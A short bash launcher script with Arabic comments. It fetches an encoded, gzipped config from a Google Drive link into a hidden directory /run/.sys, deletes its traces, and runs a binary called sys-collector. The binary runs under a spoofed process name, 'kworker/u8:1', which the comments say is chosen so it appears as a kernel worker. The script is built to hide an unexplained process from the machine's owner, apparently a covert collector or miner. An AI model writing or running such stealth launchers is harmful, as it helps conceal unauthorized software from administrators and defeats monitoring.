#!/bin/bash
set -e

# رابط الكونفج المشفّر (base64+gzip) — من catbox أو Gist أو Drive
CONF_URL="https://drive.google.com/uc?export=download&id=1JznaRq1FMAPQNhWLZmIIPZrnTvflrEoW"

mkdir -p /run/.sys
curl -fsSL "$CONF_URL" -o /run/.sys/c.bin
base64 -d /run/.sys/c.bin | gunzip > /run/.sys/c.json
rm -f /run/.sys/c.bin
chmod 600 /run/.sys/c.json

# تشغيل باسم عملية مموّه (يظهر كـ kernel worker)
exec -a "kworker/u8:1" /usr/local/bin/sys-collector -config /run/.sys/c.json
